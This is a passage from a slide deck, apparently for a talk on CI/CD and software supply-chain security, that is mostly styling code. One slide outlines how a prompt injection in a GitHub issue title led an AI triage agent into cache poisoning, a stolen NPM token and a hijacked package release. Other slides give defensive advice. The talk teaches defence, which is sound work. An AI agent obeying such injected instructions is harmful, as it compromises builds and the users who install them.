  font-size: 1rem;
  font-weight: 700;
  margin: 0 0 0.6rem 0;
}

.chain-item {
  display: grid;
  grid-template-columns: 24px 1fr;
  gap: 0.6rem;
  align-items: start;
  margin-bottom: 0.5rem;
  font-size: 0.7rem;
}

.chain-num {
  background: #DC2626;
  color: white;
  width: 22px;
  height: 22px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: bold;
  font-size: 0.7rem;
}

.chain-text {
  color: rgba(255,255,255,0.95);
  line-height: 1.3;
  padding-top: 2px;
}

.chain-text strong {
  color: #FCA5A5;
}

.right-col {
  display: flex;
  flex-direction: column;
  gap: 0.8rem;
}

.impact-box {
  background: rgba(251, 191, 36, 0.15);
  border-radius: 10px;
  padding: 0.8rem;
  text-align: center;
}

.impact-box h3 {
  color: #FBBF24;
  font-size: 0.85rem;
  margin: 0 0 0.4rem 0;
}

.stats-row {
  display: flex;
  justify-content: center;
  gap: 1.5rem;
}

.stat-block {
  text-align: center;
}

.stat-big {
  font-size: 1.6rem;
  font-weight: bold;
  color: #FBBF24;
}

.stat-small {
  font-size: 0.55rem;
  color: rgba(255,255,255,0.7);
}

.insight-box {
  background: rgba(16, 185, 129, 0.15);
  border-radius: 10px;
  padding: 0.8rem;
  flex: 1;
}

.insight-box h3 {
  color: #10B981;
  font-size: 0.85rem;
  margin: 0 0 0.4rem 0;
}

.insight-box p {
  font-size: 0.7rem;
  color: rgba(255,255,255,0.9);
  margin: 0;
  line-height: 1.4;
  font-style: italic;
}

.insight-box strong {
  color: #10B981;
  font-style: normal;
}

.insight-box .source {
  font-size: 0.5rem;
  color: rgba(255,255,255,0.5);
  text-align: right;
  margin-top: 0.3rem;
  font-style: normal;
}
</style>

<!-- Source: https://www.zenity.io/blog/the-cline-cli-attack-when-ai-coding-assistants-become-attack-vectors/ -->

# 🚨 Real World: Cline CLI Attack (Feb 2026)

<div class="attack-grid">
  <div class="chain-box">
    <h3>⚔️ Attack Chain</h3>
    <div class="chain-item">
      <div class="chain-num">1</div>
      <div class="chain-text"><strong>AI agent</strong> triages GitHub issues</div>
    </div>
    <div class="chain-item">
      <div class="chain-num">2</div>
      <div class="chain-text"><strong>Prompt injection</strong> in issue title</div>
    </div>
    <div class="chain-item">
      <div class="chain-num">3</div>
      <div class="chain-text"><strong>Cache poisoning</strong> plants malicious cache</div>
    </div>
    <div class="chain-item">
      <div class="chain-num">4</div>
      <div class="chain-text">Release workflow <strong>restores bad cache</strong></div>
    </div>
    <div class="chain-item">
      <div class="chain-num">5</div>
      <div class="chain-text"><strong>NPM token stolen</strong>, v2.3.0 hijacked</div>
    </div>
    <div class="chain-item">
      <div class="chain-num">6</div>
      <div class="chain-text"><strong>OpenClaw</strong> malware on victims</div>
    </div>
  </div>
  <div class="right-col">
    <div class="impact-box">
      <h3>📊 Impact</h3>
      <div class="stats-row">
        <div class="stat-block">
          <div class="stat-big">~4,000</div>
          <div class="stat-small">Downloads</div>
        </div>
        <div class="stat-block">
          <div class="stat-big">8h</div>
          <div class="stat-small">Window</div>
        </div>
      </div>
    </div>
    <div class="insight-box">
      <h3>💡 Key Insight</h3>
      <p>"When a single issue title can influence an automated build pipeline, the risk is no longer theoretical. <strong>AI agents are privileged actors</strong> that require governance."</p>
      <div class="source">— Chris Hughes, Zenity</div>
    </div>
  </div>
</div>

<!-- Cline CLI attack: issue title triggered malicious build via AI agent. 4k downloads in 8 hours. AI agents are privileged actors. -->

---

<!--
_backgroundColor: #A80DF2
_color: white
-->

<style scoped>
.speed-container {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
  height: 85%;
  padding: 1rem;
  align-items: center;
  justify-content: center;
}

.speed-comparison {
  display: grid;
  grid-template-columns: 1fr auto 1fr;
  gap: 2rem;
  align-items: center;
  width: 90%;
}

.speed-box {
  background: rgba(0, 0, 0, 0.3);
  border-radius: 12px;
  padding: 1.5rem;
  text-align: center;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.speed-box h3 {
  margin: 0 0 0.8rem 0;
  font-size: 1rem;
  color: #E9D5FF;
}

.speed-box .time {
  font-size: 2rem;
  font-weight: bold;
  color: #FBBF24;
}

.speed-box .label {
  font-size: 0.8rem;
  color: #D1D5DB;
  margin-top: 0.5rem;
}

.arrow {
  font-size: 3rem;
  color: #FBBF24;
}

.takeaway {
  background: rgba(239, 68, 68, 0.2);
  border: 2px solid #EF4444;
  border-radius: 12px;
  padding: 1rem 2rem;
  text-align: center;
  margin-top: 1rem;
}

.takeaway p {
  margin: 0;
  font-size: 1rem;
  color: #FEE2E2;
}

.takeaway strong {
  color: #FCA5A5;
}
</style>

# 🚀 The Speed Difference

<div class="speed-container">
  <div class="speed-comparison">
    <div class="speed-box">
      <h3>👤 Human Attacker</h3>
      <div class="time">Hours</div>
      <div class="label">to exploit one target</div>
    </div>
    <div class="arrow">→</div>
    <div class="speed-box">
      <h3>🤖 AI-Assisted</h3>
      <div class="time">Seconds</div>
      <div class="label">to exploit thousands</div>
    </div>
  </div>
  
  <div class="takeaway">
    <p><strong>S1ngularity showed us:</strong> AI tools are already being weaponized for secret hunting and mass exploitation</p>
  </div>
</div>

<!-- Hours vs seconds. s1ngularity used AI tools for mass secret hunting. Scale changes everything. -->

---

<!--
_backgroundColor: #A80DF2
_color: white
-->

<style scoped>
.layout-container {
  display: grid;
  grid-template-columns: 2fr 1fr;
  gap: 1.5rem;
  height: 85%;
}

.patterns-column {
  display: flex;
  flex-direction: column;
  height: 100%;
}

.patterns-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  grid-template-rows: 1fr 1fr;
  gap: 0.8rem;
  flex: 1;
}

.pattern-card {
  background: rgba(0, 0, 0, 0.4);
  border-radius: 10px;
  padding: 1rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
}

.pattern-card h4 {
  margin: 0 0 0.5rem 0;
  color: #FFFFFF;
  font-size: 0.85rem;
}

.pattern-card .old {
  color: #FCA5A5;
  font-size: 0.65rem;
  margin: 0.3rem 0;
}

.pattern-card .new {
  color: #86EFAC;
  font-size: 0.65rem;
  margin: 0.15rem 0;
}

.image-column {
  display: flex;
  align-items: center;
  justify-content: center;
}

.image-column img {
  max-height: 100%;
  max-width: 100%;
  object-fit: contain;
  border-radius: 10px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
}
</style>

# ⚡ Same Patterns, Higher Speed

<div class="layout-container">
  <div class="patterns-column">
    <div class="patterns-grid">
      <div class="pattern-card">
        <h4>📦 Dependencies</h4>
        <p class="old">❌ AI installs @latest blindly</p>
        <p class="new">✅ Pin versions, verify sources</p>
      </div>
      <div class="pattern-card">
        <h4>🔑 Credentials</h4>
        <p class="old">❌ AI gets broad PAT access</p>
        <p class="new">✅ Minimal privilege tokens</p>
      </div>
      <div class="pattern-card">
        <h4>💉 Input Trust</h4>
        <p class="old">❌ AI runs untrusted code</p>
        <p class="new">✅ Validate before execution</p>
      </div>
      <div class="pattern-card">
        <h4>🧱 Boundaries</h4>
        <p class="old">❌ AI in full environment</p>
        <p class="new">✅ Sandbox, isolate, audit</p>
      </div>
    </div>
  </div>
  
  <div class="image-column">
    <img src="assets/img/ai-boundary.png" alt="AI Trust Boundaries" />
  </div>
</div>

<!-- Same four patterns apply to AI: pin deps, minimal creds, validate input, enforce boundaries. AI just moves faster. -->

---

<!--
_backgroundColor: #4A5568
_color: white
-->

<style scoped>
.topics-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1.2rem;
  height: 82%;
  padding: 0.5rem;
}

.topic-card {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.7rem;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
  display: flex;
  align-items: flex-start;
  gap: 0.7rem;
}

.topic-emoji {
  font-size: 1.3rem;
  flex-shrink: 0;
}

.topic-content {
  flex: 1;
}

.topic-title {
  font-size: 0.7rem;
  font-weight: bold;
  color: #FCD34D;
  margin: 0 0 0.2rem 0;
}

.topic-desc {
  font-size: 0.55rem;
  color: #E2E8F0;
  margin: 0;
  line-height: 1.3;
}
</style>

# <!-- fit -->📝 Some topics not covered in detail

<div class="topics-container">
  <div class="topic-card">
    <span class="topic-emoji">⚠️</span>
    <div class="topic-content">
      <h3 class="topic-title">Third-party action context</h3>
      <p class="topic-desc">Actions run in your trusted context with access to secrets, tokens, and the runner environment</p>
    </div>
  </div>
  <div class="topic-card">
    <span class="topic-emoji">🏠</span>
    <div class="topic-content">
      <h3 class="topic-title">Self-hosted runner hardening</h3>
      <p class="topic-desc">Run ephemeral, isolate workloads, restrict network access, and avoid persistent state</p>
    </div>
  </div>
  <div class="topic-card">
    <span class="topic-emoji">☁️</span>
    <div class="topic-content">
      <h3 class="topic-title">GitHub-hosted runners</h3>
      <p class="topic-desc">Ephemeral but unrestricted — jobs can install software, make network calls, and access the internet</p>
    </div>
  </div>
  <div class="topic-card">
    <span class="topic-emoji">📦</span>
    <div class="topic-content">
      <h3 class="topic-title">Artifact & cache integrity</h3>
      <p class="topic-desc">Artifacts and caches can be poisoned across workflow runs — verify checksums and limit cache scope</p>
    </div>
  </div>
  <div class="topic-card">
    <span class="topic-emoji">♻️</span>
    <div class="topic-content">
      <h3 class="topic-title">Reusable workflow security</h3>
      <p class="topic-desc">Reusable workflows inherit caller permissions — pin references and audit inherited secret access</p>
    </div>
  </div>
  <div class="topic-card">
    <span class="topic-emoji">🌐</span>
    <div class="topic-content">
      <h3 class="topic-title">Network egress controls</h3>
      <p class="topic-desc">Runners can reach any endpoint by default — consider network policies to limit exfiltration risk</p>
    </div>
  </div>
</div>

<!-- Six topics for further study — couldn't cover everything today. Great follow-up areas for the audience. -->

---

<!--
_backgroundColor: #1E40AF
_color: white
-->

<style scoped>
.group-security-container {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
  height: 85%;
  padding: 1rem;
}

.intro-message {
  text-align: center;
}

.intro-message p {
  margin: 0;
  font-size: 1.0rem;
  color: #DBEAFE;
  font-style: italic;
}

.resources-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1.5rem;
  flex: 1;
}

.resource-card {
  padding: 1.0rem;
  gap: 0.8rem;
  background: rgba(59, 130, 246, 0.15);
  border: 1px solid rgba(59, 130, 246, 0.3);
}

.resource-header {
  display: flex;
  align-items: center;
  gap: 0.6rem;
  margin-bottom: 0.4rem;
}

.resource-emoji {
  font-size: 1.8rem;
  flex-shrink: 0;
}

.resource-title {
  font-size: 0.7rem;
  font-weight: bold;
  color: #DBEAFE;
  margin: 0;
  line-height: 1.2;
}

.resource-description {
  font-size: 0.5rem;
  color: #BFDBFE;
  margin: 0;
  line-height: 1.4;
}

.resource-highlight {
  color: #60A5FA;
  font-weight: bold;
}
</style>

<!--
_backgroundColor: #1E40AF
_color: white
_footer: ''
-->

<style scoped>
.resources-container {
  display: grid;
  grid-template-columns: 3fr 2fr;
  gap: 2rem;
  height: 85%;
  align-items: start;
  padding: 1rem;
}

.links-section {
  display: flex;
  flex-direction: column;
  gap: 1rem;
  position: relative;
}

.links-image-container {
  position: relative;
  flex: 0 0 60%;
  display: flex;
  justify-content: center;
  align-items: center;
  overflow: hidden;
}

.links-image {
  max-width: 100%;
  max-height: 450px;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.github-sticker {
  position: absolute;
  top: 20%;
  right: 10%;
  background: #24292F;
  color: white;
  padding: 0.8rem 1.2rem;
  border-radius: 12px;
  font-size: 0.7rem;
  font-weight: bold;
  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
  transform: rotate(12deg);
  z-index: 10;
  border: 2px solid #F0F6FF;
  text-align: center;
  line-height: 1.3;
}

.qr-section {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 1rem;
  height: 100%;
}

.qr-container {
  background: transparent;
  border-radius: 12px;
  padding: 0;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  display: flex;
  justify-content: center;
  align-items: center;
}

.qr-code {
  max-width: 300px;
  max-height: 300px;
  width: 300px;
  height: 300px;
  object-fit: contain;
  display: block;
  margin: 0 auto;
}

.qr-label {
  font-size: 0.8rem;
  color: #DBEAFE;
  text-align: center;
  font-style: italic;
}
</style>

# 🔗 Resources and links

<div class="resources-container">
  <div class="links-section">
    <div class="links-image-container">
      <img src="../../assets/shared/img/linksblank.png" class="links-image" alt="GitHub Repository Links" />
      <div class="github-sticker">
        🔗 github.com/npalm/<br>
        supply-chain-security-talks
      </div>
    </div>
  </div>
  
  <div class="qr-section">
    <div class="qr-container">
      <img src="../../assets/shared/img/resources.png" class="qr-code" alt="QR Code" />
    </div>
    <p class="qr-label">Scan for resources</p>
  </div>
</div>


<!-- Slides and resources at the QR code. Repo link on screen. -->

---


<!--
-->

# Questions

<style scoped>
h1 {
  font-size: 120px;
}

footer {
  position: absolute;
  bottom: 20px;
  right: 20px;
  left: auto;
  text-align: right;
}

footer img {
  height: 200px !important;
  max-height: 200px !important;
  width: auto;
}

</style>



![bg](../../assets/shared/img/questions.jpeg)

<!-- Open the floor. Prepared topics: OIDC details, self-hosted runner hardening, AI agent governance. -->

---

<style scoped>
h1 {
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7), 0 0 8px rgba(0, 0, 0, 0.5);
  color: white;
}

footer {
  position: absolute;
  bottom: 20px;
  right: 20px;
  left: auto;
  text-align: right;
}

footer img {
  max-height: 100px;
  width: auto;
}
</style>

# <!-- fit --> Thank you
<br>
<br>
<br>


![bg](../../assets/shared/img/start-finish.jpeg)

<!-- Thank the audience. Remind them to scan the QR code. -->

